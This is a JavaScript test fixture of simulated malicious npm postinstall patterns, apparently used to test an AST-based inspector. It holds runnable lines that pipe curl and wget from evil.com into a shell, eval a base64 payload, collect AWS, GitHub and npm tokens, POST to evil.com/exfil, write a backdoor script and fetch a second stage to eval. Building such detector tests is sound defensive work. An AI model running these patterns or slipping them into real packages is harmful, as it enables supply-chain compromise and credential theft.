// Simulated malicious postinstall patterns for testing AST inspector
// Each function represents a real-world attack pattern

// Pattern 1: Direct child_process exec (event-stream attack)
const cp = require('child_process');
cp.exec('curl http://evil.com/payload.sh | sh');

// Pattern 2: Destructured require (most common npm attack vector)
const { execSync } = require('child_process');
execSync('wget http://evil.com/rat -O /tmp/rat && chmod +x /tmp/rat && /tmp/rat');

// Pattern 3: eval with encoded payload
const payload = Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString();
eval(payload);

// Pattern 4: Environment harvesting
const secrets = {
  aws: process.env.AWS_SECRET_ACCESS_KEY,
  github: process.env.GITHUB_TOKEN,
  npm: process.env.NPM_TOKEN,
};

// Pattern 5: Self-deletion (axios RAT pattern)
const fs = require('fs');
fs.unlinkSync(__filename);

// Pattern 6: Network exfil
const https = require('https');
https.request('https://evil.com/exfil', { method: 'POST' });

// Pattern 7: System path write
fs.writeFileSync('/tmp/backdoor.sh', '#!/bin/sh\ncurl evil.com | sh');

// Pattern 8: new Function constructor
const fn = new Function('return process.env');

// Pattern 9: fetch + eval callback
fetch('https://evil.com/stage2').then(r => r.text()).then(eval);

// Pattern 10: process.binding escape hatch
process.binding('spawn_sync');

// Pattern 11: Dynamic import
const mod = 'child_' + 'process';
import(mod);

// Pattern 12: String concatenation evasion
require('child' + '_process');
